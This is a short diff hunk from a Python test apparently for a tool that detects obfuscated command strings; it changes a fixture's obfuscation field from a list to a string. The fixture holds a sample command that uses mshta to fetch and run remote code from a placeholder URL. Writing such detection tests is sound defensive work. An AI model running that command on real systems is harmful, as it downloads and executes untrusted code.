@@ -90,7 +90,7 @@ def test_find_cmd_strings():
             value=b"cmd /c mshta http://some.url/x.html",
             start=13,
             end=55,
-            obfuscation=["unescape.shell.carets"],
+            obfuscation="unescape.shell.carets",
         )
     ]
 
